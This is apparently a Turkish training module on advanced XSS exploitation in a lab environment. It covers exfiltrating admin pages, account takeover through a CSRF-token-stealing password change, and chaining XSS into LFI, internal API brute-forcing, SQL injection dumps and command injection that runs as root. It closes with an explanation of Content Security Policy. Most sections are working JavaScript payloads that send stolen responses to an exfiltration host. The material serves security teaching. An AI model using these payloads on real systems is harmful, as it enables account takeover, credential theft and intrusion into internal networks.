Not: Daha önce de belirtildiği gibi, kısıtlı URL uzunluğu nedeniyle GET parametresiyle sayfanın tamamına sızmak kötü bir uygulamadır. Daha iyi bir uygulama, bir POST isteğinde veri sızdırmak olacaktır. Daha kısa kod nedeniyle, bu modüldeki çoğu kod örneği GET isteklerini kullanacaktır, ancak alıştırmaları çözerken ve gerçek dünya etkileşimleri sırasında bunu aklınızda bulundurun.

Kurbanın payload'umuzu tetiklemesini bekledikten sonra, exfiltration sunucumuzda base64 kodlu yanıtı alacağız;

![Pasted image 20241217110040.png](/img/user/resimler/Pasted%20image%2020241217110040.png)

Response'un kodunu çözdükten sonra, düşük ayrıcalıklı kullanıcımızın /home.php endpoint'te erişebildiği şeylerle herhangi bir farklılık olup olmadığını görmek için analiz edebiliriz. Yanıtın navigasyon bölümünde /admin.php adresindeki admin panosuna bir referans olduğunu ve bu referansın kullanıcımızın context'inde bulunmadığını tespit edebiliriz:

![Pasted image 20241217110224.png](/img/user/resimler/Pasted%20image%2020241217110224.png)

Bunun yerine /admin.php endpoint'ine sızmak için exploit sunucusundaki payload'u ayarlayarak, orada görüntülenen potansiyel olarak hassas veriler de dahil olmak üzere yönetici kontrol paneline sızalım:

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin.php', false);
xhr.withCredentials = true;
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Yönetici ziyaretçi defterini periyodik olarak ziyaret ettiği ve her seferinde XSS payload'umuzu tetiklediği için ziyaretçi defterine yeni bir giriş göndermiyoruz. Bu, payload kodunun exploit sunucusundan yüklenmesini tetiklediğinden, exploit kodunu orada değiştirmek yeterlidir. Bu, yönetici tarafından erişilebilen tüm bilgiler dahil olmak üzere tüm yönetici kontrol paneline sızmamızı sağlar:

![Pasted image 20241217110355.png](/img/user/resimler/Pasted%20image%2020241217110355.png)

# Launching Attacks from the Victim's Session

Bir XSS açığı ile kurbanın kullanıcı context'inden nasıl veri sızdırılacağını tartıştıktan sonra, potansiyel olarak state-changing eylemlerinin nasıl tetikleneceğini keşfedeceğiz. XSS bize kurbanın oturumu üzerinde tam kontrol sağladığından, web uygulamasının kurbanın kullanıcı context'inde uyguladığı herhangi bir fonksiyonu tetikleyebiliriz. Bu, kurbanın hesabının tamamen ele geçirilmesine yol açabilir veya başka saldırı vektörlerini etkinleştirebilir.

Bu modül XSS açıklarını tespit etmekten ziyade güçlü XSS istismarları yazmakla ilgili olduğundan, önceki bölümlerde gördüğümüz aynı savunmasız web uygulamasını ele alacağız.


## Account Takeover

Bu kez örnek web uygulamamız, kullanıcının şifresi de dahil olmak üzere kullanıcı profilini güncellemek için bir fonksiyon içeriyor:

![Pasted image 20241217110827.png](/img/user/resimler/Pasted%20image%2020241217110827.png)

Profilin güncellenmesi aşağıdaki HTTP isteği kullanılarak gerçekleştirilir:

![Pasted image 20241217110907.png](/img/user/resimler/Pasted%20image%2020241217110907.png)

Hesabın şifresinin güncellenmesi eski şifreyi gerektirmediğinden, kurbanın şifresini değiştirmek için bilinen XSS güvenlik açığını kullanabiliriz. Bu, kurbanın hesabına giriş yapmamızı ve tamamen ele geçirmemizi sağlar. Form bir CSRF tokenı kullanılarak korunuyor, ancak bir XSS açığı olduğundan, CSRF tokenını okuyabilir ve isteğe ekleyebiliriz.

Bunu başarmak için, önceki bölümlerde kullandığımız ve istismar sunucusundan JavaScript kodu yükleyen aynı XSS istismarını kullanalım:

```html
<script src=""http://exploitserver.htb/exploit"></script>
```

Ardından, geçerli bir CSRF token alabilmek için **/home.php**'ye bir GET isteği gönderebilir, bu token'ı çıkarabilir ve sonrasında kurbanın şifresini **pwned** olarak değiştirmek için bir POST isteği gönderebiliriz.

```js
// GET CSRF token
var xhr = new XMLHttpRequest();
xhr.open('GET', '/home.php', false);
xhr.withCredentials = true;
xhr.send();
var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
var csrftoken = encodeURIComponent(doc.getElementById('csrf_token').value);

// change PW
var csrf_req = new XMLHttpRequest();
var params = `username=admin&[email protected]&password=pwned&csrf_token=${csrftoken}`;
csrf_req.open('POST', '/home.php', false);
csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
csrf_req.withCredentials = true;
csrf_req.send(params);
```

Admin kullanıcısının XSS'i tetiklemesini bekledikten sonra, kurbanın hesabına admin:pwned kimlik bilgileriyle giriş yapabiliriz.


### Zincirleme Güvenlik Açıkları

Yukarıda gördüğümüz gibi, web uygulaması içindeki herhangi bir fonksiyonu kurbanın kullanıcı context'inden tetiklemek için XSS güvenlik açıklarını kötüye kullanabiliriz. Bir adım daha ileri gidebilir ve web uygulamasındaki farklı bir güvenlik açığından yalnızca kurban tarafından erişilebilen bir endpoint'te yararlanarak birden fazla güvenlik açığını zincirleyebiliriz.

Bunu yapmak için öncelikle web uygulamasını kurbanın bakış açısından analiz etmemiz, kurbanın erişebileceği ve bizim kendi kullanıcı hesabımızla erişemeyeceğimiz endpointleri belirlememiz ve son olarak XSS payload'umuz aracılığıyla belirlediğimiz güvenlik açıklarını test edip kullanmamız gerekir.

İstismar sunucusundaki istismarı özelleştirmemizi sağlayan aynı temel XSS payload'unu tekrar kullanacağız:

```html
<script src=""http://exploitserver.htb/exploit"></script>
```

Kurbanın kullanıcı context'inden /home.php endpoint'ine sızmak, kullanıcımız tarafından erişilemeyen /admin.php endpoint'ini ortaya çıkarır:

![Pasted image 20241217111530.png](/img/user/resimler/Pasted%20image%2020241217111530.png)

Yönetici endpoint'inde görüntülenen verileri tanımlamak için, önceki bölümde kullandığımız aynı payload'u yanıtı exfiltrate etmek için kullanabiliriz:

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin.php', false);
xhr.withCredentials = true;
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Bu, aşağıdaki HTML yanıtını ortaya çıkarır:

![Pasted image 20241217111640.png](/img/user/resimler/Pasted%20image%2020241217111640.png)


HTML kaynak kodu incelendiğinde, yönetici endpoint'inin geçerli çalışma dizinindeki farklı dosyalara ayarlanabilen GET parametresi görünümünü desteklediği görülmektedir. Bu, Local File Inclusion (LFI) güvenlik açığı için bariz bir giriş noktasıdır. Hipotezimizi test etmek için, yükümüzü /etc/passwd dosyasını içerecek şekilde ayarlayalım:

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin.php?view=../../../../etc/passwd', false);
xhr.withCredentials = true;
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/lfi?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Kurbanın XSS açığını tekrar tetiklemesini bekledikten sonra, sızıntı sunucumuza sızan dosyamızı içeren aşağıdaki yanıtı alıyoruz:

![Pasted image 20241217111919.png](/img/user/resimler/Pasted%20image%2020241217111919.png)

Not: HTML kodunu lokal bir dosyaya kaydedebilir ve sayfayı görüntülemek için bir web tarayıcısında açabiliriz. Bu, sayfayı doğru şekilde oluşturmak için kod dosyaları veya stil sayfaları gibi ek dosyalar sızdırmamızı gerektirebilir.


### İç API'leri numaralandırma
Gördüğümüz gibi, XSS güvenlik açıklarını kurbanın kullanıcı context'indeki fonksiyonelliği tetiklemek ve kurbanın erişebildiği verileri dışarı sızdırmak için kullanabiliriz. Bununla birlikte, XSS payload'u kurbanın tarayıcısında çalıştırıldığından, yalnızca kurbanın özel ağında erişilebilen başka web uygulamalarına da saldırmamızı sağlar



### İç API'nin tanımlanması

Exploit'imiz tıpkı önceki bölümlerde olduğu gibi başlayacaktır. Temel XSS payload'umuzu bir ziyaretçi defteri girişi olarak göndererek başlayacağız:

```html
<script src=""http://exploitserver.htb/exploit"></script>
```

Daha sonra, potansiyel olarak ilginç yalnızca yönetici fonksiyonelliğini belirlemek için yönetici endpoint'ine sızacağız:

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin.php', false);
xhr.withCredentials = true;
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Bu da aşağıdaki yanıtı ortaya çıkarmaktadır:

![Pasted image 20241217132453.png](/img/user/resimler/Pasted%20image%2020241217132453.png)


Gördüğümüz gibi, admin endpoint http://api.vulnerablesite.htb/ adresindeki bir API'den ek bilgi yüklüyor. Ancak, API'ye erişmeye çalıştığımızda engelleniyoruz, bu da API'ye yalnızca kurbanın lokal ağından erişilebildiğini gösteriyor:

![Pasted image 20241217132705.png](/img/user/resimler/Pasted%20image%2020241217132705.png)

Bu nedenle, XSS payload'umuzu kurbanın tarayıcısından API'yi numaralandıracak şekilde ayarlamalıyız.


## Enumerating the internal API

Admin endpoint'inde sızdırılan endpoint'i, yani /v1/sessions endpoint'ini sızdırarak başlayalım. Bunu XSS payload'umuzu buna göre ayarlayarak yapabiliriz:

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://api.vulnerablesite.htb/v1/sessions', false);
xhr.withCredentials = true;
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Payload'umuzu güncelledikten ve bir süre bekledikten sonra, exfiltration sunucusunda bir şeylerin yanlış gittiğini gösteren ek veri almadık.

Farklı bir origin ile konuştuğumuz için, API Same-Origin politikasını atlamak için uygun CORS başlıklarını uygulamadığı sürece Same-Origin politikası yanıta erişmemizi engeller. Admin endpoint'i API'den cross-origin veri aldığından, API'nin CORS yapılandırmasına sahip olduğunu varsayabiliriz, bu nedenle yanıta erişebilmemiz gerekir. Ancak, verileri getiren client-side JavaScript kodunu daha yakından analiz edersek, fetch fonksiyonuna yapılan çağrının credentials: 'include' setine sahip olmadığını görebiliriz. Öte yandan, payload'umuzda withCredentials özelliğini açıkça ayarladık. API, Access-Control-Allow-Credentials CORS başlığını ayarlayarak buna izin vermezse, Same-Origin politikası atlanamaz ve bir CORS hatası atılarak yanıta erişmemiz engellenir. Bunu aşmak için, sızdırılan fetch çağrısında ayarlanan parametreleri eşleştirmemiz ve isteği kimlik bilgileri olmadan göndermemiz gerekir:

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://api.vulnerablesite.htb/v1/sessions', false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Bu, CORS sorunlarıyla karşılaşmamak için iç API tarafından beklenen yapılandırmayı tam olarak eşleştirmemiz gerektiğini göstermektedir. API'ye doğrudan ulaşamadığımız ve bu nedenle yanıtta ayarlanan CORS başlıklarını belirleyerek CORS yapılandırmasını analiz edemediğimiz için, yapılandırmayı dahili API ile iletişimi uygulayan sızdırılmış HTML koduna kopyalamamız gerekir. Bir CORS hatası, sonraki ifadelerin yürütülmesini engeller. Bu nedenle, yanıtın sızdırılmasını sağlayan doğru CORS yapılandırmasını tanımlamak için bir try-catch bloğu kullanılması önerilir. Bu, payload'umuzda daha kolay hata ayıklamamızı sağlar:

```js
try {
	var xhr = new XMLHttpRequest();
	xhr.open('GET', 'http://api.vulnerablesite.htb/v1/sessions', false);
	xhr.withCredentials = true;
	xhr.send();
	var msg = xhr.responseText;
} catch (error) {
	var msg = error;
}

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(msg), false);
exfil.send();
```

Bu, HTTP isteğimizde bir şeylerin yanlış gittiğini gösteren ve isteğin yapılandırmasını CORS yapılandırmasıyla eşleşecek şekilde değiştirmemize olanak tanıyan aşağıdaki sızan bilgilerle sonuçlanacaktır:

NetworkError: 'XMLHttpRequest' üzerinde 'send' çalıştırılamadı: 'http://api.vulnerablesite.htb/v1/sessions' yüklenemedi.

Ayrıca, iç API cookie yerine bir kimlik doğrulama taşıyıcısı ile kimlik doğrulama gerektirebilir. Güvenlik açığı bulunan web uygulaması contex'inde kurbanın local depolama alanında depolanan bir kimlik doğrulama taşıyıcısına erişmek için localStorage özelliğini kullanabiliriz. Daha sonra setRequestHeader fonksiyonunu kullanarak XMLHttpRequest üzerindeki Authorization başlığını ayarlayabiliriz.

Not: Beklenen verileri alamadığınızda CORS yapılandırmasıyla ilgili bir sorun veya kimlik doğrulama eksikliği olabileceğini unutmayın.

CORS hatasını önlemek için uygun değişikliği yaptıktan sonra, sızıntı sunucusundan verileri alırız ve daha sonra bunları çözebiliriz:

```shell-session
[!bash!]$ echo -n eyJzZXNzaW9ucyI6W3siYWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTA5LjAuNTQxNC4xMjAgU2FmYXJpLzUzNy4zNiIsInRpbWUiOiIxNjkxNjQ1NzMxIiwidXNlciI6ImFkbWluIn0seyJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDkuMC41NDE0LjEyMCBTYWZhcmkvNTM3LjM2IiwidGltZSI6IjE2OTI1OTYxMzEiLCJ1c2VyIjoiYWRtaW4ifSx7ImFnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwOS4wLjU0MTQuMTIwIFNhZmFyaS81MzcuMzYiLCJ0aW1lIjoiMTY5MzIwMDkzMSIsInVzZXIiOiJhZG1pbiJ9XX0K | base64 -d | jq

{
  "sessions": [
    {
      "agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36",
      "time": "1691645731",
      "user": "admin"
    },
    {
      "agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36",
      "time": "1692596131",
      "user": "admin"
    },
    {
      "agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36",
      "time": "1693200931",
      "user": "admin"
    }
  ]
}
```


Veriler ilginç bilgiler içermediğinden, ek endpointleri tanımlamak için API'yi daha fazla numaralandıralım. Mevcut tüm endpointleri sızıntı sunucusuna sızdıran XSS payload'umuzda bir dizin brute-forcer uygulayarak ek endpointleri belirleyebiliriz. Kavram kanıtımızı SecLists'teki objects-lowercase.txt kelime listesine dayandıracağız. Payload her bir endpoint'e bir istek gönderecek ve ardından durum kodunu kontrol ederek endpoint'in geçerli olup olmadığını belirleyecektir. Bunu aşağıdakine benzer bir payload ile başarabiliriz:

```js
var endpoints = ['access-token','account','accounts','amount','balance','balances','bar','baz','bio','bios','category','channel','chart','circular','company','content','contract','coordinate','credentials','creds','custom','customer','customers','details','dir','directory','dob','email','employee','event','favorite','feed','foo','form','github','gmail','group','history','image','info','item','job','link','links','location','log','login','logins','logs','map','member','members','messages','money','my','name','names','news','option','options','pass','password','passwords','phone','picture','pin','post','prod','production','profile','profiles','publication','record','sale','sales','set','setting','settings','setup','site','test','theme','token','tokens','twitter','union','url','user','username','users','vendor','vendors','version','website','work','yahoo'];

for (i in endpoints){
	try {
		var xhr = new XMLHttpRequest();
		xhr.open('GET', `http://api.vulnerablesite.htb/v1/${endpoints[i]}`, false);
		xhr.send();
		
		if (xhr.status != 404){
			var exfil = new XMLHttpRequest();
			exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(endpoints[i]), false);
			exfil.send();
		}
	} catch {
		// do nothing
	}
}
```

Bu, mevcut API endpoint'lerini exfiltration sunucusuna sızdırır ve daha sonra bunları daha fazla analiz edebiliriz:

![Pasted image 20241217133823.png](/img/user/resimler/Pasted%20image%2020241217133823.png)

Farklı istek yöntemleri veya bruteforce parametreleri deneyerek brute-forcer'ı geliştirebiliriz.


# Exploiting internal Web Applications I

Son bölümde, iç web uygulamalarından veri sızdırmak için bir XSS güvenlik açığını kullanmayı tartıştık. Bu bölümde, kurbanın private network'ünde bulunan tamamen farklı bir web uygulamasındaki güvenlik açığını tespit etmek ve istismar etmek için XSS açığını kullanacağız.


### Güvenlik Açığının Belirlenmesi

Önceki bölümlerde kullanılan aynı temel XSS payload'u ve /admin.php endpoint'inin exfiltrasyonu ile başlayacağız. İlgili payload'u önceki bölümlerde tartıştığımız için burada atlayacağız.

Kurban XSS açığını tetiklediğinde, response sızma sunucusuna sızdırılır. Yönetici endpoint'inin http://internal.vulnerablesite.htb adresindeki dahili bir web uygulamasına referans içerdiğini görebiliriz:

![Pasted image 20241217134611.png](/img/user/resimler/Pasted%20image%2020241217134611.png)

Sayfaya doğrudan erişmeye çalışırsak engelleniyoruz:

![Pasted image 20241217134637.png](/img/user/resimler/Pasted%20image%2020241217134637.png)

Bu nedenle, son bölümde iç API ile yaptığımız gibi web uygulamasını numaralandırmak için XSS güvenlik açığını kullanalım. Web uygulamasının dizinine sızarak başlayacağız:

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://internal.vulnerablesite.htb/', false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Bu, dizin bir oturum açma formundan oluştuğu için dahili web uygulamasının kimlik doğrulama ile korunduğunu ortaya koymaktadır:

![Pasted image 20241217134953.png](/img/user/resimler/Pasted%20image%2020241217134953.png)

XSS güvenlik açığı, dahili web uygulamasıyla tamamen etkileşime girmemizi sağlar. Varsayılan parolaları deneyebilir veya endpointleri  brute force ile  zorlayabiliriz. Ancak bu bölümde SQL enjeksiyonu güvenlik açığına odaklanacağız. Oturum açma formundan, dahili web uygulamasının kabul ettiği geçerli bir oturum açma POST isteği oluşturabiliriz. Tek bir tırnak işareti içeren bir kullanıcı adı göndererek basit bir SQL enjeksiyonu deneyelim:

```js
var xhr = new XMLHttpRequest();
var params = `uname=${encodeURIComponent("'test")}&pass=x`;
xhr.open('POST', 'http://internal.vulnerablesite.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Bu, dahili web uygulamasının SQL enjeksiyonuna karşı savunmasız olduğunu doğrulayan aşağıdaki yanıtla sonuçlanır:

```html
HTTP 500 - SQL Error
```

## Exploiting the Vulnerability

Oturum açmayı atlayarak ve veritabanını dump ederek SQL injection açığından yararlanacağız.

' OR '1'='1'-- - kullanıcı adı ile elde edebileceğimiz kimlik doğrulamasını atlayarak başlayacağız:

```js
var xhr = new XMLHttpRequest();
var params = `uname=${encodeURIComponent("' OR '1'='1' -- -")}&pass=x`;
xhr.open('POST', 'http://internal.vulnerablesite.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Bu, oturum açma sonrası ekranda aşağıdaki bilgileri ortaya çıkarır:

```
(1, 'admin', 'InternalAdmin2023!', 'This is the default admin account.')
```


Veriler kullanıcı adı, parola ve hesap açıklaması gibi görünüyor. Tüm kullanıcı tablosunu dump ederek bunu doğrulayalım. Veritabanı sistemini, diğer SQL enjeksiyon güvenlik açıkları gibi ortak payloadları numaralandırarak tespit edebiliriz. Bizim durumumuzda, bir SQLite veritabanı ile uğraşıyoruz. Çıktıda dört sütun var gibi göründüğünden, tüm tabloları dump etmek için aşağıdaki payload'u kullanabiliriz:

```js
var xhr = new XMLHttpRequest();
var params = `uname=${encodeURIComponent("' UNION SELECT 1,2,3,group_concat(tbl_name) FROM sqlite_master-- -")}&pass=x`;
xhr.open('POST', 'http://internal.vulnerablesite.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Daha sonra, users tablosunun şemasını dump edebiliriz:

```js
var xhr = new XMLHttpRequest();
var params = `uname=${encodeURIComponent("' UNION SELECT 1,2,3,group_concat(sql) FROM sqlite_master WHERE name='users'-- -")}&pass=x`;
xhr.open('POST', 'http://internal.vulnerablesite.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Bu, aşağıdaki veritabanı şemasını ortaya çıkarır:

```sql
CREATE TABLE `users` (
	`id` int(11) NOT NULL,
	`username` varchar(256) NOT NULL,
	`password` longtext NOT NULL,
	`info` longtext NOT NULL
)
```

Son olarak, users tablosunu aşağıdaki payload ile döngüsel olarak dump edebiliriz:

```js
var xhr = new XMLHttpRequest();
var params = `uname=${encodeURIComponent("' UNION SELECT id,username,password,info FROM users-- -")}&pass=x`;
xhr.open('POST', 'http://internal.vulnerablesite.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Aynı yöntemle veritabanındaki diğer tabloları da boşaltabiliriz. Bu, XSS güvenlik açığının ne kadar güçlü olduğunu gösterir, çünkü normalde dışarıdan bir saldırgan tarafından erişilemeyen savunmasız web uygulamalarını hedeflememize olanak tanır. Payload kurbanın tarayıcısında çalıştırıldığından, iç web uygulamalarına da erişilebilir ve böylece hedef alınabilir. SQL enjeksiyonu güvenlik açıkları hakkında daha fazla bilgi için Advanced SQL Injections modülüne göz atın.

Not: İç web uygulamasında bir CORS yanlış yapılandırması veya savunmasız web uygulamasının iç web uygulamasıyla etkileşime girmesini sağlayan bir CORS yapılandırması olması gerektiğini unutmayın. Aksi takdirde, Same-Origin ilkesi dahili web uygulamasından gelen yanıta erişimi engeller.


# Exploiting internal Web Applications II

Bir XSS açığı yoluyla iç web uygulamasında bir SQL enjeksiyon açığından nasıl yararlanılacağını tartıştıktan sonra, bu bölümde XSS yoluyla bir command injection açığından nasıl yararlanılacağını inceleyeceğiz. Metodoloji aynı olsa da, süreç karmaşık ancak güçlü olduğu için iyi anlaşılması çok önemlidir. Kapsamlı bir anlayış, karmaşık gerçek dünya güvenlik açıklarının tanımlanmasına yardımcı olabilir.


## Identifying the Vulnerability

Tanımlama süreci, önceki bölümde tartışıldığı gibi temelde aynıdır. Aynı temel XSS payload'unu kullanacağız ve admin endpoint hala http://internal.vulnerablesite.htb adresindeki iç web uygulamasına aynı referansı içeriyor. Dahili web uygulamasının dizinine sızmak için aşağıdaki payload'u kullanabiliriz:

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://internal.vulnerablesite.htb/', false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Bu, web uygulamasını farklı web uygulamalarının durumunu kontrol etmek için kullanabileceğimizi gösteren aşağıdaki HTML içeriğini ortaya çıkarır:

![Pasted image 20241217140445.png](/img/user/resimler/Pasted%20image%2020241217140445.png)

Web uygulamasının bu fonksiyonu tam olarak nasıl uyguladığını belirlemek için formu analiz ederek ilgili POST isteğini oluşturabiliriz:

```js
var xhr = new XMLHttpRequest();
var params = `webapp_selector=${encodeURIComponent("http://vulnerablesite.htb")}`;
xhr.open('POST', 'http://internal.vulnerablesite.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Bu da aşağıdaki yanıta neden olur:

```http
HTTP/1.1 200 OK
```

Bir hata mesajı oluşturup oluşturamayacağımızı görmek için mevcut olmayan bir domain deneyelim:

```js
var xhr = new XMLHttpRequest();
var params = `webapp_selector=${encodeURIComponent("http://doesnotexist.htb")}`;
xhr.open('POST', 'http://internal.vulnerablesite.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Bu da aşağıdaki yanıta neden olur:

```http
curl: (6) Could not resolve host: doesnotexist.htb
```

Gördüğümüz gibi, durum curl kullanılarak elde ediliyor gibi görünüyor. Eğer bu yanlış uygulanmışsa ya da uygun bir sanitizasyon yoksa, potansiyel bir komut enjeksiyonu açığı vardır. Bunu, exfiltrasyon sunucusuna ek bir curl komutu enjekte ederek doğrulayabiliriz:

```js
var xhr = new XMLHttpRequest();
var params = `webapp_selector=${encodeURIComponent("| curl http://exfiltrate.htb?pwn")}`;
xhr.open('POST', 'http://internal.vulnerablesite.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```


Daha sonra, sızıntı sunucusunda beklenen isteği görebiliriz, böylece komut enjeksiyonu güvenlik açığını doğrulayabiliriz:

![Pasted image 20241217140917.png](/img/user/resimler/Pasted%20image%2020241217140917.png)


## Exploiting the Vulnerability

Komut enjeksiyon payloadını XSS payload'umuzda belirtebilir ve sonucu exfiltration sunucusuna exfiltrate edebiliriz. Bu nedenle, exploitation diğer komut enjeksiyonu güvenlik açıklarından farklı değildir. Örneğin, id komutunu çalıştırabiliriz

```js
ar xhr = new XMLHttpRequest();
var params = `webapp_selector=${encodeURIComponent("| id")}`;
xhr.open('POST', 'http://internal.vulnerablesite.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Sonuç base64 kodlu yanıtta yer alır:

```bash
uid=0(root) gid=0(root) groups=0(root)
```



# Content Security Policy (CSP)

[Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP), istismar edilebilirliklerini sınırlandırarak Cross-Site Scripting (XSS) güvenlik açıklarının şiddetini azaltmak için kullanılabilecek derinlemesine bir güvenlik önlemidir. Content-Security-Policy response header'ında yapılandırılır.


## CSP Basics

Bir **CSP** (Content Security Policy), birden fazla yönergeden (directive) oluşur. Her yönerge bir veya daha fazla değer kabul eder. Tarayıcı, CSP'yi uygular ve CSP'ye bağlı olarak kaynakların yüklenmesini veya çalıştırılmasını engeller. Bu bölümde birkaç örnek yönergeyi ele alacağız.

Örneğin, **script-src** yönergesi, JavaScript'in nereden yüklenip çalıştırılabileceğini tanımlar; aşağıdaki politika ile JavaScript kodunun yalnızca belirli domainden yüklenmesine izin verebiliriz:

Bu, tarayıcıya, JavaScript'i yalnızca sayfanın kendisiyle aynı kaynaktan (**same-origin**) ve harici kaynak olarak **[http://benignsite.htb](http://benignsite.htb)** adresinden yüklemesi gerektiğini söyler. Bu nedenle, bir saldırgan bir **XSS payload**'ında aşağıdaki JavaScript kodunu enjekte ederse, kurbanın tarayıcısı bu script'i yüklemez ve dolayısıyla çalıştırmaz:

```html
<script src=""http://exploitserver.htb/pwn.js"></script>
```

Ancak, aşağıdaki komut dosyalarının yüklenmesine ve yürütülmesine izin verilir:

```html
<script src=""/js/useful.js"></script>
<script src=""http://benignsite.htb/main.js"></script>
```

Ayrıca, unsafe-inline değeri belirtilmediğinden, tüm satır içi komut dosyalarını engeller. Bu nedenle, aşağıdaki potansiyel XSS payload'larının tümü engellenir ve dolayısıyla çalıştırılmaz:

```html
<script>alert(1)</script>
<img src=x onerror=alert(1) />
<a href="javascript:alert(1)">click</a>
```

Ayrıca, başka yaygın direktifler de vardır:

- **`style-src`**: Stil dosyaları (**stylesheets**) için izin verilen kaynaklar
- **`img-src`**: Görseller için izin verilen kaynaklar
- **`object-src`**: `<object>` veya `<embed>` gibi nesneler için izin verilen kaynaklar
- **`connect-src`**: Script'lerden yapılan HTTP istekleri için izin verilen kaynaklar. Örneğin, **`XMLHttpRequest`** kullanımı
- **`default-src`**: Belirli bir yönerge açıkça belirtilmediğinde kullanılan varsayılan değer. Örneğin, eğer **`img-src`** CSP'de belirtilmemişse, tarayıcı görseller için bu değeri kullanır
- **`frame-ancestors`**: Sayfanın bir `<iframe>` içinde çerçevelenmesine izin verilen kaynaklar. Bu, **`Clickjacking`** saldırılarını önlemek için kullanılabilir
- **`form-action`**: Form gönderimleri için izin verilen kaynaklar

Ek CSP yönergeleri için [burada](https://content-security-policy.com/) verilen listeye göz atın.

Yönergeler için ek değerler şunları içerir:

- **`*`**: Tüm kaynaklara izin verilir
- **`'none'`**: Hiçbir kaynağa izin verilmez
- **`*.benignsite.htb`**: **`benignsite.htb`** alan adının tüm alt alan adlarına izin verilir
- **`unsafe-inline`**: Satır içi (inline) öğelere izin verilir
- **`unsafe-eval`**: JavaScript'in **`eval`** fonksiyonu gibi dinamik kod değerlendirmelerine izin verilir
